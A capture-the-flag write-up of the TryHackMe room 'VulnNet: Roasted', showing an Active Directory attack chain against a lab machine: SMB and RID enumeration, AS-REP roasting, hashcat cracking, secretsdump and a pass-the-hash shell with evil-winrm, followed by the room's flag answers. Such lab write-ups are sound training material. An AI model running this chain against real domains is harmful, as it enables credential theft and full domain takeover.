# VulnNet Roasted — TryHackMe

**Author:** pwnboberry  
**Date:** May 2026  

---
The goal of the VulnNet: 
Roasted room is to use Active Directory enumeration techniques to detect and exploit common misconfigurations found in domain environments.

### Starting with a port scan:
```bash
nmap -sC –sV ip
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/nmap.png)

The domain name was also discovered: vulnnet-rst.local

### Running smbclient
Using the command:
```bash
smbclient -L \\IP\\
```
the list of shared resources was retrieved.
Some folders were found that were later used to search for files.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/smbclient.png)

### Anonymous RID brute‑forcing using:
```bash
impacket-lookupsid -no-pass guest@IP
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/lookupsid.png)

A complete list of domain users was obtained, but only the last 5 (real users) were of interest.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/users.png)

Based on this output, a file realusers.txt was created with the list of usernames for further work.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/realusers.png)

### AS-REP Roasting — obtaining a hash
The command:
```bash
impacket-GetNPUsers.py -dc-ip IP vulnnet-rst.local/ -usersfile realusers.txt -no-pass
 ```
checked all users and returned a hash only for t-skid (Kerberos pre‑authentication is disabled for this account).
The hash was saved to a file hash.txt.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/GetNPUsers.png)

The password hash for t-skid was cracked with:
```bash
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
Result:

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/pswd.PNG)

### Finding a password dump via SMB
Using the credentials of the user t-skid, we connected to the SMB share and discovered a password dump file, which was downloaded for further analysis.
![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/resetpasswords.png)

The SMB share contained a file with a login and password that were used to dump hashes for all users.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/whitehat.png)

Thus, using the command
```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat@IP
 ```
the administrator’s password hash was retrieved.

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/adminhash.png)

### Connecting to the machine
```bash
evil-winrm -u administrator -H хэш -i IP
```
![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/evilwinrm.png)

An interactive session with NT AUTHORITY\SYSTEM privileges was obtained.

### Searching for the user flags
The following paths were found on the system:
```bash
C:\Users\Administrator\Desktop\system.txt
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/1.png)

<details>
<summary>Question:: What is the system flag? (Desktop\system.txt)?</summary>

Answer: THM{16f45e3934293a57645f8d7bf71d8d4c}

</details>

```bash
C:\Users\t-skid\Desktop\user.txt 
```

![](https://github.com/Pwnboberry/writeups/blob/main/VulnNet_Roasted/images/2.png)

<details>
<summary>Question: What is the user flag? (Desktop\user.txt)</summary>

Answer: THM{726b7c0baaac1455d05c827b5561f4ed}

</details>

## Conclusion
During the VulnNet: Roasted room, Active Directory enumeration methods and Kerberos attacks were successfully applied.
The user and system flags were extracted, confirming the completion of the room.

The room demonstrates a typical Active Directory attack chain, where initial access through AS-REP Roasting, 
combined with credential leakage in network shares, leads to full domain compromise.
